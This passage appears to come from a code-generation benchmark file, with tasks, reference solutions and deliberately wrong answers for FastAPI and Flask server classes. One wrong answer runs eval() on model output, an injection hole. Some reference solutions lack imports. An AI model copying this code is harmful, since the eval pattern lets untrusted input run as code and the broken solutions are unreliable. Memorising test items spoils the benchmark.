conn.close()\n\n    def _make_request(self, conn, method, url, timeout=None, **httplib_request_kw):\n        conn.request(method, url, **httplib_request_kw)\n        response = conn.getresponse()\n        return response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=None, pool_timeout=None, release_conn=None, **response_kw):\n        conn = self._get_conn(pool_timeout)\n        try:\n            response = self._make_request(conn, method, url, timeout=timeout)\n        except Exception as e:\n            self._put_conn(conn)\n            raise e\n        return response\n```"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server for handling image segmentation and processing requests using SAM (Segment Anything Model) and related models.\n\nClass Description: SamAPI is a class that encapsulates all the route handlers for a FastAPI application dealing with image segmentation tasks. It provides endpoints for model prediction, mask dilation, and various segmentation techniques.\n\nAttributes:\n- app: FastAPI - The FastAPI application instance that will handle HTTP requests\n\nMethods:\n- __init__(app: FastAPI) -> None - Initializes the SamAPI class with a FastAPI instance and sets up routes\n- _setup_routes() -> None - Private method that defines all API endpoints and their handlers\n\nRoute Handlers (methods defined within _setup_routes):\n- heartbeat() -> Dict - Simple health check endpoint\n- api_sam_model() -> List[str] - Returns available SAM models\n- api_sam_predict(payload: SamPredictRequest) -> Any - Handles SAM model prediction requests\n- api_dino_predict(payload: DINOPredictRequest) -> Any - Handles DINO model prediction requests\n- api_dilate_mask(payload: DilateMaskRequest) -> Any - Handles mask dilation requests\n- api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any - Handles ControlNet segmentation requests\n- api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any - Handles category-specific mask generation requests\n\nSupporting Models (Pydantic BaseModel classes):\n- SamPredictRequest - Request model for SAM predictions\n- DINOPredictRequest - Request model for DINO predictions\n- DilateMaskRequest - Request model for mask dilation\n- AutoSAMConfig - Configuration model for AutoSAM parameters\n- ControlNetSegRequest - Request model for ControlNet segmentation\n- CategoryMaskRequest - Request model for category-specific masking",
    "Canonical_solution": "from fastapi import FastAPI, Body\nfrom pydantic import BaseModel\nfrom typing import Any, Optional, List\nfrom PIL import Image\nimport numpy as np\nimport os\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    class SamPredictRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        sam_positive_points: List[List[float]] = []\n        sam_negative_points: List[List[float]] = []\n        dino_enabled: bool = False\n        dino_model_name: Optional[str] = \"GroundingDINO_SwinT_OGC (694MB)\"\n        dino_text_prompt: Optional[str] = None\n        dino_box_threshold: Optional[float] = 0.3\n        dino_preview_checkbox: bool = False\n        dino_preview_boxes_selection: Optional[List[int]] = None\n\n    class DINOPredictRequest(BaseModel):\n        input_image: str\n        dino_model_name: str = \"GroundingDINO_SwinT_OGC (694MB)\"\n        text_prompt: str\n        box_threshold: float = 0.3\n\n    class DilateMaskRequest(BaseModel):\n        input_image: str\n        mask: str\n        dilate_amount: int = 10\n\n    class AutoSAMConfig(BaseModel):\n        points_per_side: Optional[int] = 32\n        points_per_batch: int = 64\n        pred_iou_thresh: float = 0.88\n        stability_score_thresh: float = 0.95\n        stability_score_offset: float = 1.0\n        box_nms_thresh: float = 0.7\n        crop_n_layers: int = 0\n        crop_nms_thresh: float = 0.7\n        crop_overlap_ratio: float = 512 / 1500\n        crop_n_points_downscale_factor: int = 1\n        min_mask_region_area: int = 0\n\n    class ControlNetSegRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n\n    class CategoryMaskRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n        category: str\n        input_image: str\n\n    def _setup_routes(self):\n        @self.app.get(\"/sam/heartbeat\")\n        async def heartbeat():\n            return {\"msg\": \"Success!\"}\n\n        @self.app.get(\"/sam/sam-model\")\n        async def api_sam_model() -> List[str]:\n            return sam_model_list\n\n        @self.app.post(\"/sam/sam-predict\")\n        async def api_sam_predict(payload: SamPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert('RGBA')\n            sam_output_mask_gallery, sam_message = sam_predict(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.sam_positive_points,\n                payload.sam_negative_points,\n                payload.dino_enabled,\n                payload.dino_model_name,\n                payload.dino_text_prompt,\n                payload.dino_box_threshold,\n                payload.dino_preview_checkbox,\n                payload.dino_preview_boxes_selection)\n            result = {\"msg\": sam_message}\n            if len(sam_output_mask_gallery) == 9:\n                result[\"blended_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[:3]))\n                result[\"masks\"] = list(map(encode_to_base64, sam_output_mask_gallery[3:6]))\n                result[\"masked_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[6:]))\n            return result\n\n        @self.app.post(\"/sam/dino-predict\")\n        async def api_dino_predict(payload: DINOPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            dino_output_img, _, dino_msg = dino_predict(\n                payload.input_image,\n                payload.dino_model_name,\n                payload.text_prompt,\n                payload.box_threshold)\n            return {\n                \"msg\": dino_msg[\"value\"] if \"value\" in dino_msg else \"Done\",\n                \"image_with_box\": encode_to_base64(dino_output_img) if dino_output_img is not None else None,\n            }\n\n        @self.app.post(\"/sam/dilate-mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert(\"RGBA\")\n            payload.mask = decode_to_pil(payload.mask)\n            dilate_result = list(map(encode_to_base64, update_mask(payload.mask, 0, payload.dilate_amount, payload.input_image)))\n            return {\"blended_image\": dilate_result[0], \"mask\": dilate_result[1], \"masked_image\": dilate_result[2]}\n\n        @self.app.post(\"/sam/controlnet-seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest = Body(...),\n                                    autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            cnet_seg_img, cnet_seg_msg = cnet_seg(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            cnet_seg_img = list(map(encode_to_base64, cnet_seg_img))\n            result = {\"msg\": cnet_seg_msg}\n            if len(cnet_seg_img) == 3:\n                result[\"blended_images\"] = cnet_seg_img[0]\n                result[\"random_seg\"] = cnet_seg_img[1]\n                result[\"edit_anything_control\"] = cnet_seg_img[2]\n            elif len(cnet_seg_img) == 4:\n                result[\"sem_presam\"] = cnet_seg_img[0]\n                result[\"sem_postsam\"] = cnet_seg_img[1]\n                result[\"blended_presam\"] = cnet_seg_img[2]\n                result[\"blended_postsam\"] = cnet_seg_img[3]\n            return result\n\n        @self.app.post(\"/sam/category-mask\")\n        async def api_category_mask(payload: CategoryMaskRequest = Body(...),\n                                  autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            category_mask_img, category_mask_msg, resized_input_img = categorical_mask(\n                payload.sam_model_name,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                payload.category,\n                payload.input_image,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            category_mask_img = list(map(encode_to_base64, category_mask_img))\n            result = {\"msg\": category_mask_msg}\n            if len(category_mask_img) == 3:\n                result[\"blended_image\"] = category_mask_img[0]\n                result[\"mask\"] = category_mask_img[1]\n                result[\"masked_image\"] = category_mask_img[2]\n            if resized_input_img is not None:\n                result[\"resized_input\"] = encode_to_base64(resized_input_img)\n            return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, APIRouter, Depends\nfrom pydantic import BaseModel\nfrom typing import Any, Dict, List\nimport numpy as np\n\napp = FastAPI()\nrouter = APIRouter()\n\nclass SamPredictRequest(BaseModel):\n    image: str\n    points: List[List[float]]\n    labels: List[int]\n    model_name: str = \"vit_b\"\n\nclass DINOPredictRequest(BaseModel):\n    image: str\n    query: str\n\nclass DilateMaskRequest(BaseModel):\n    mask: List[List[int]]\n    kernel_size: int = 3\n\nclass AutoSAMConfig(BaseModel):\n    confidence_threshold: float = 0.5\n    nms_threshold: float = 0.5\n\nclass ControlNetSegRequest(BaseModel):\n    image: str\n    controlnet_conditioning_scale: float = 1.0\n\nclass CategoryMaskRequest(BaseModel):\n    image: str\n    category_id: int\n\nclass SamAPI:\n    def __init__(self, app: FastAPI) -> None:\n        self.app = app\n        self._setup_routes()\n\n    def _setup_routes(self) -> None:\n        @router.get(\"/heartbeat\")\n        async def heartbeat():\n            return {\"status\": \"healthy\"}\n\n        @router.get(\"/sam/models\")\n        async def api_sam_model():\n            return [\"vit_b\", \"vit_l\", \"vit_h\"]\n\n        @router.post(\"/sam/predict\")\n        async def api_sam_predict(payload: SamPredictRequest):\n            # Placeholder for SAM prediction logic\n            return {\"message\": f\"Processed with {payload.model_name}\"}\n\n        @router.post(\"/dino/predict\")\n        async def api_dino_predict(payload: DINOPredictRequest):\n            # Placeholder for DINO prediction logic\n            return {\"query\": payload.query, \"result\": \"detected_objects\"}\n\n        @router.post(\"/mask/dilate\")\n        async def api_dilate_mask(payload: DilateMaskRequest):\n            # Placeholder for mask dilation logic\n            return {\"dilated_mask\": [[1, 1], [1, 1]]}\n\n        @router.post(\"/controlnet/seg\")\n        async def api_controlnet_seg(\n            payload: ControlNetSegRequest,\n            autosam_conf: AutoSAMConfig = Depends(lambda: AutoSAMConfig())\n        ):\n            # Placeholder for ControlNet segmentation logic\n            return {\n                \"image\": payload.image,\n                \"conditioning_scale\": payload.controlnet_conditioning_scale\n            }\n\n        @router.post(\"/category/mask\")\n        async def api_category_mask(\n            payload: CategoryMaskRequest,\n            autosam_conf: AutoSAMConfig = Depends(lambda: AutoSAMConfig())\n        ):\n            # Placeholder for category-specific mask generation logic\n            return {\"category_id\": payload.category_id, \"mask\": [[1, 1], [1, 1]]}\n\n        self.app.include_router(router)\n\nSamAPI(app)\n```"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Create a FastAPI-based service for extracting and citing facts from a given context in response to a user query, using OpenAI's language model for processing and providing streaming responses.\n\nClass Description: ExtractionService is a FastAPI application that handles question-answering with citation extraction. It processes user queries against provided context, extracts facts with proper citations, and streams the results back to the client.\n\nAttributes:\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes\nclient: OpenAI - The OpenAI client configured for structured output using the instructor library\n\nMethods:\n__init__: () -> None - Initializes the FastAPI application and sets up routes\n_setup_routes: () -> None - Configures the API endpoints and their handlers\nextract: (question: Question, openai_key: str) -> StreamingResponse - The endpoint handler that processes extraction requests and returns streaming responses\nstream_extract: (question: Question) -> Iterable[Fact] - Performs the actual extraction using OpenAI's API and yields facts\nget_api_key: (request: Request) -> str - Retrieves the OpenAI API key from either environment variables or request headers",
    "Canonical_solution": "from fastapi import FastAPI, Request, HTTPException, Depends\nfrom fastapi.params import Depends\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom collections.abc import Iterable\nimport json\nimport os\nimport logging\nfrom instructor import OpenAISchema\nfrom instructor.dsl.multitask import MultiTaskBase\nfrom openai import OpenAI\nimport instructor\n\nclient = instructor.from_openai(OpenAI())\nlogger = logging.getLogger(__name__)\n\nclass Fact(BaseModel):\n    fact: str = Field(\n        ...,\n        description=\"Body of the sentences, as part of a response, it should read like a sentence that answers the question\",\n    )\n    substring_quotes: list[str] = Field(\n        ...,\n        description=\"Each source should be a direct quote from the context, as a substring of the original content\",\n    )\n\n    def _get_span(self, quote, context):\n        import regex\n        minor = quote\n        major = context\n        errs_ = 0\n        s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        while s is None and errs_ <= len(context) * 0.05:\n            errs_ += 1\n            s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        if s is not None:\n            yield from s.spans()\n\n    def get_spans(self, context):\n        if self.substring_quotes:\n            for quote in self.substring_quotes:\n                yield from self._get_span(quote, context)\n\nclass QuestionAnswer(OpenAISchema, MultiTaskBase):\n    question: str = Field(..., description=\"Question that was asked\")\n    tasks: list[Fact] = Field(\n        ...,\n        description=\"Body of the answer, each fact should be its separate object with a body and a list of sources\",\n    )\n\nQuestionAnswer.task_type = Fact\n\nclass Question(BaseModel):\n    context: str = Field(..., description=\"Context to extract answers from\")\n    query: str = Field(..., description=\"Question to answer\")\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI(title=\"Citation with Extraction\")\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\", response_class=StreamingResponse)\n        async def extract(question: Question, openai_key: str = Depends(self.get_api_key)):\n            facts = self.stream_extract(question)\n            async def generate():\n                for fact in facts:\n                    logger.info(f\"Fact: {fact}\")\n                    spans = list(fact.get_spans(question.context))\n                    resp = {\n                        \"body\": fact.fact,\n                        \"spans\": spans,\n                        \"citation\": [question.context[a:b] for (a, b) in spans],\n                    }\n                    resp_json = json.dumps(resp)\n                    yield f\"data: {resp_json}\"\n                yield \"data: [DONE]\"\n            return StreamingResponse(generate(), media_type=\"text/event-stream\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        completion = client.chat.completions.create(\n            model=\"gpt-3.5-turbo-0613\",\n            temperature=0,\n            stream=True,\n            functions=[QuestionAnswer.openai_schema],\n            function_call={\"name\": QuestionAnswer.openai_schema[\"name\"]},\n            messages=[\n                {\n                    \"role\": \"system\",\n                    \"content\": \"You are a world class algorithm to answer questions with correct and exact citations.\",\n                },\n                {\"role\": \"user\", \"content\": \"Answer question using the following context\"},\n                {\"role\": \"user\", \"content\": f\"{question.context}\"},\n                {\"role\": \"user\", \"content\": f\"Question: {question.query}\"},\n                {\n                    \"role\": \"user\",\n                    \"content\": \"Tips: Make sure to cite your sources, and use the exact words from the context.\",\n                },\n            ],\n            max_tokens=2000,\n        )\n        return QuestionAnswer.from_streaming_response(completion)\n\n    def get_api_key(self, request: Request):\n        if \"OPENAI_API_KEY\" in os.environ:\n            return os.environ[\"OPENAI_API_KEY\"]\n        auth = request.headers.get(\"Authorization\")\n        if auth is None:\n            raise HTTPException(status_code=401, detail=\"Missing Authorization header\")\n        if auth.startswith(\"Bearer \"):\n            return auth.replace(\"Bearer \", \"\")\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Depends, Request, HTTPException\nfrom pydantic import BaseModel\nfrom typing import Iterable\nfrom openai import OpenAI\nfrom instructor import Instructor\nfrom fastapi.responses import StreamingResponse\nimport os\n\napp = FastAPI()\n\nclass Question(BaseModel):\n    text: str\n    context: str\n\nclass Fact(BaseModel):\n    statement: str\n    citation: str\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = app\n        self._setup_routes()\n        self.client = Instructor(OpenAI())\n\n    def _setup_routes(self):\n        @app.post(\"/extract\")\n        async def extract(\n            question: Question,\n            request: Request,\n            openai_key: str = Depends(self.get_api_key)\n        ):\n            return StreamingResponse(self.stream_extract(question), media_type=\"application/json\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        response = self.client.chat.completions.create(\n            model=\"gpt-3.5-turbo\",\n            messages=[\n                {\"role\": \"system\", \"content\": \"You are an AI assistant that extracts facts from the provided context and cites them properly.\"},\n                {\"role\": \"user\", \"content\": f\"Question: {question.text}\\nContext: {question.context}\"}\n            ],\n            stream=True,\n            response_format={\"type\": \"json_object\"}\n        )\n        for chunk in response:\n            if chunk.choices and chunk.choices[0].delta.content:\n                content = chunk.choices[0].delta.content.strip()\n                try:\n                    fact_data = eval(content)\n                    yield Fact(**fact_data)\n                except Exception as e:\n                    continue\n\n    def get_api_key(self, request: Request) -> str:\n        api_key = os.getenv(\"OPENAI_API_KEY\")\n        if not api_key:\n            raise HTTPException(status_code=401, detail=\"Missing OpenAI API key\")\n        return api_key\n\nextraction_service = ExtractionService()\n```"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server implementation that handles dynamic route creation, exception translation, and streaming responses, with built-in tracing middleware for request monitoring.\n\nClass Description: LlamaStackServer is a configurable HTTP server implementation using FastAPI that provides dynamic route creation, exception handling, and support for streaming responses (SSE). It includes middleware for request tracing and manages the lifecycle of implementation components.\n\nAttributes:\n\nconfig: [dict] - Configuration dictionary for server setup\napp: [FastAPI] - Main FastAPI application instance\nimpls: [Optional[dict]] - Dictionary of implementation components managed by the server\n\nMethods:\n\n__init__: [Name](config: dict) -> [None] - Initializes the server with given configuration and sets up FastAPI app with tracing middleware\nlifespan: [Name](app: FastAPI) -> [AsyncContextManager] - Async context manager for server lifecycle (startup/shutdown)\nglobal_exception_handler: [Name](request: Request, exc: Exception) -> [JSONResponse] - Handles all uncaught exceptions and translates them to HTTP responses\ntranslate_exception: [Name](exc: Exception) -> [Union[HTTPException, RequestValidationError]] - Converts Python exceptions to appropriate HTTP exceptions\ncreate_dynamic_typed_route: [Name](func: Any, method: str) -> [Callable] - Creates a FastAPI route handler with proper typing and parameter handling\nis_streaming_request: [Name](func_name: str, request: Request, **kwargs) -> [bool] - Determines if a request should be handled as a streaming response\nmaybe_await: [Name](value: Any) -> [Coroutine] - Helper method to await coroutines or return values directly\nsse_generator: [Name](event_gen: AsyncGenerator) -> [AsyncGenerator] - Converts an async generator to Server-Sent Events (SSE) format\ncreate_sse_event: [Name](data: Any) -> [str] - Formats data as an SSE event string",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom pydantic import BaseModel\nfrom typing import Any, Union\nimport asyncio\nimport inspect\nimport json\nfrom typing_extensions import Annotated\n\nclass TracingMiddleware:\n    def __init__(self, app):\n        self.app = app\n\n    async def __call__(self, scope, receive, send):\n        path = scope[\"path\"]\n        await start_trace(path, {\"__location__\": \"server\"})\n        try:\n            return await self.app(scope, receive, send)\n        finally:\n            await end_trace()\n\nclass LlamaStackServer:\n    def __init__(self, config):\n        self.config = config\n        self.app = FastAPI(lifespan=self.lifespan)\n        self.app.add_middleware(TracingMiddleware)\n        self.impls = None\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        print(\"Starting up\")\n        yield\n        print(\"Shutting down\")\n        for impl in app.__llama_stack_impls__.values():\n            await impl.shutdown()\n\n    async def global_exception_handler(self, request: Request, exc: Exception):\n        traceback.print_exception(exc)\n        http_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=http_exc.status_code, \n            content={\"error\": {\"detail\": http_exc.detail}}\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValidationError):\n            exc = RequestValidationError(exc.raw_errors)\n\n        if isinstance(exc, RequestValidationError):\n            return HTTPException(\n                status_code=400,\n                detail={\n                    \"errors\": [\n                        {\n                            \"loc\": list(error[\"loc\"]),\n                            \"msg\": error[\"msg\"],\n                            \"type\": error[\"type\"],\n                        }\n                        for error in exc.errors()\n                    ]\n                },\n            )\n        elif isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=f\"Invalid value: {str(exc)}\")\n        elif isinstance(exc, PermissionError):\n            return HTTPException(status_code=403, detail=f\"Permission denied: {str(exc)}\")\n        elif isinstance(exc, TimeoutError):\n            return HTTPException(status_code=504, detail=f\"Operation timed out: {str(exc)}\")\n        elif isinstance(exc, NotImplementedError):\n            return HTTPException(status_code=501, detail=f\"Not implemented: {str(exc)}\")\n        else:\n            return HTTPException(\n                status_code=500,\n                detail=\"Internal server error: An unexpected error occurred.\",\n            )\n\n    def create_dynamic_typed_route(self, func: Any, method: str):\n        async def endpoint(request: Request, **kwargs):\n            set_request_provider_data(request.headers)\n\n            is_streaming = self.is_streaming_request(func.__name__, request, **kwargs)\n            try:\n                if is_streaming:\n                    return StreamingResponse(\n                        self.sse_generator(func(**kwargs)), media_type=\"text/event-stream\"\n                    )\n                else:\n                    value = func(**kwargs)\n                    return await self.maybe_await(value)\n            except Exception as e:\n                traceback.print_exception(e)\n                raise self.translate_exception(e) from e\n\n        sig = inspect.signature(func)\n        new_params = [\n            inspect.Parameter(\n                \"request\", inspect.Parameter.POSITIONAL_OR_KEYWORD, annotation=Request\n            )\n        ]\n        new_params.extend(sig.parameters.values())\n\n        if method == \"post\":\n            new_params = [new_params[0]] + [\n                param.replace(annotation=Annotated[param.annotation, Body(..., embed=True)])\n                for param in new_params[1:]\n            ]\n\n        endpoint.__signature__ = sig.replace(parameters=new_params)\n        return endpoint\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs):\n        return kwargs.get(\"stream\", False)\n\n    async def maybe_await(self, value):\n        if inspect.iscoroutine(value):\n            return await value\n        return value\n\n    async def sse_generator(self, event_gen):\n        try:\n            event_gen = await event_gen\n            async for item in event_gen:\n                yield self.create_sse_event(item)\n                await asyncio.sleep(0.01)\n        except asyncio.CancelledError:\n            print(\"Generator cancelled\")\n            await event_gen.aclose()\n        except Exception as e:\n            traceback.print_exception(e)\n            yield self.create_sse_event(\n                {\n                    \"error\": {\n                        \"message\": str(self.translate_exception(e)),\n                    },\n                }\n            )\n\n    def create_sse_event(self, data: Any) -> str:\n        if isinstance(data, BaseModel):\n            data = data.model_dump_json()\n        else:\n            data = json.dumps(data)\n        return f\"data: {data}\\n\\n\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Request, HTTPException, Depends, Response\nfrom fastapi.exceptions import RequestValidationError\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom fastapi.middleware.tracing import BaseTracingMiddleware\nfrom contextlib import asynccontextmanager\nimport asyncio\nfrom typing import Any, Callable, Coroutine, Dict, Optional, Union, AsyncGenerator\n\nclass LlamaStackServer:\n    def __init__(self, config: dict):\n        self.config = config\n        self.app = FastAPI(lifespan=self.lifespan)\n        self.impls: Optional[dict] = None\n        self.app.add_middleware(BaseTracingMiddleware)\n        self.app.add_exception_handler(Exception, self.global_exception_handler)\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        # Startup logic\n        print(\"Starting up server...\")\n        yield\n        # Shutdown logic\n        print(\"Shutting down server...\")\n\n    async def global_exception_handler(self, request: Request, exc: Exception) -> JSONResponse:\n        translated_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=translated_exc.status_code,\n            content={\"error\": str(translated_exc.detail)},\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, HTTPException):\n            return exc\n        elif isinstance(exc, RequestValidationError):\n            return exc\n        else:\n            return HTTPException(status_code=500, detail=\"Internal Server Error\")\n\n    def create_dynamic_typed_route(self, func: Any, method: str) -> Callable:\n        async def route(**kwargs):\n            result = self.maybe_await(func(**kwargs))\n            if self.is_streaming_request(func.__name__, request=None, **kwargs):\n                return StreamingResponse(self.sse_generator(result))\n            return result\n        return route\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs) -> bool:\n        return \"stream\" in kwargs and kwargs[\"stream\"] is True\n\n    def maybe_await(self, value: Any) -> Coroutine:\n        if asyncio.iscoroutine(value):\n            return value\n        return asyncio.get_event_loop().create_future().set_result(value)\n\n    async def sse_generator(self, event_gen: AsyncGenerator) -> AsyncGenerator:\n        async for data in event_gen:\n            yield self.create_sse_event(data)\n\n    def create_sse_event(self, data: Any) -> str:\n        return f\"data: {data}\\n\\n\"\n```"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Flask-based web application class that serves as an interface to retrieve and display data from a Redis database, including application settings and time series metrics.\n\nClass Description: FlaskWebApp is a class that encapsulates a Flask web server with Redis connectivity. It provides routes for serving a frontend interface, application settings, and metric data from Redis. The class handles request processing, data retrieval from Redis, and response generation.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- redis_conn: [redis.Redis] - Connection to the Redis database\n- PROPAGATE_EXCEPTIONS: [bool] - Flask configuration to propagate exceptions\n\nMethods:\n- __init__(redis_conn) -> [None] - Initializes the Flask application and sets up Redis connection\n- _setup_routes() -> [None] - Defines all route handlers for the web application\n- run(host, port) -> [None] - Starts the Flask development server with specified host and port\n\nRoute Handlers (internal methods):\n- index() -> [tuple(str, int)] - Serves the main index.html template (200 OK)\n- app_settings() -> [tuple(str, int)] - Returns application settings as JSON (200 OK)\n- data() -> [tuple(str, int)] - Retrieves and returns metric data from Redis (200 OK if found, 404 if not found, 500 on error)",
    "Canonical_solution": "import redis\nimport logging\nimport simplejson as json\nfrom msgpack import Unpacker\nfrom flask import Flask, request, render_template\n\nclass FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.app.config['PROPAGATE_EXCEPTIONS'] = True\n        self.redis_conn = redis_conn\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/\")\n        def index():\n            return render_template('index.html'), 200\n\n        @self.app.route(\"/app_settings\")\n        def app_settings():\n            app_settings = {\n                'GRAPH_URL': settings.GRAPH_URL,\n                'OCULUS_HOST': settings.OCULUS_HOST,\n                'FULL_NAMESPACE': settings.FULL_NAMESPACE,\n            }\n            resp = json.dumps(app_settings)\n            return resp, 200\n\n        @self.app.route(\"/api\", methods=['GET'])\n        def data():\n            metric = request.args.get('metric', None)\n            try:\n                raw_series = self.redis_conn.get(metric)\n                if not raw_series:\n                    resp = json.dumps({'results': 'Error: No metric by that name'})\n                    return resp, 404\n                else:\n                    unpacker = Unpacker(use_list=False)\n                    unpacker.feed(raw_series)\n                    timeseries = [item[:2] for item in unpacker]\n                    resp = json.dumps({'results': timeseries})\n                    return resp, 200\n            except Exception as e:\n                error = \"Error: \" + str(e)\n                resp = json.dumps({'results': error})\n                return resp, 500\n\n    def run(self, host, port):\n        self.app.run(host, port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, render_template, jsonify\nimport redis\n\nclass FlaskWebApp:\n    PROPAGATE_EXCEPTIONS = True\n\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.app.config['PROPAGATE_EXCEPTIONS'] = self.PROPAGATE_EXCEPTIONS\n        self.redis_conn = redis_conn\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.add_url_rule('/', 'index', self.index)\n        self.app.add_url_rule('/settings', 'app_settings', self.app_settings)\n        self.app.add_url_rule('/data', 'data', self.data)\n\n    def run(self, host, port):\n        self.app.run(host=host, port=port)\n\n    def index(self):\n        return render_template('index.html'), 200\n\n    def app_settings(self):\n        settings = {\n            'redis_host': self.redis_conn.connection_pool.host,\n            'redis_port': self.redis_conn.connection_pool.port,\n            'redis_db': self.redis_conn.connection_pool.db\n        }\n        return jsonify(settings), 200\n\n    def data(self):\n        try:\n            metric_key = 'time_series_metric'\n            metric_data = self.redis_conn.get(metric_key)\n            if metric_data is None:\n                return jsonify({'error': 'Metric data not found'}), 404\n            return jsonify({'metric': metric_data.decode('utf-8')}), 200\n        except Exception as e:\n            return jsonify({'error': str(e)}), 500\n```"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Flask-based HTTP server for model inference that provides RESTful APIs to list available models and perform inference using specified models.\n\nClass Description: InferenceServer is a class that encapsulates a Flask web server for serving machine learning models. It loads models from specified directories, sets up API endpoints for model listing and inference, and handles JSON serialization of NumPy data types.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- api: [flask_restplus.Api] - RESTPlus API instance for route management\n- inferencers: [dict] - Dictionary storing loaded model inferencers with IDs as keys\n\nMethods:\n- __init__([models_dirs: list[str]]) -> None - Initializes the server and loads models from specified directories\n- _load_models([models_dirs: list[str]]) -> None - Private method to load models from given directories\n- _setup_routes() -> None - Private method to define API routes and handlers\n- run([host: str, port: int]) -> None - Starts the Flask server on specified host and port\n\nNested Classes:\n- ModelListEndpoint(Resource) - Handles GET requests to list available models\n  - get() -> list[dict] - Returns list of loaded models with their metadata\n\n- InferenceEndpoint(Resource) - Handles POST requests for model inference\n  - post([model_id: int]) -> dict/str - Performs inference using specified model and returns results\n\nHelper Functions:\n- resp_json([data: Any, code: int, headers: dict]) -> flask.Response - Custom JSON response handler with NumPy serialization support\n\nCustom Encoder:\n- NumpyEncoder(json.JSONEncoder) - Custom JSON encoder that handles NumPy arrays and float32 types",
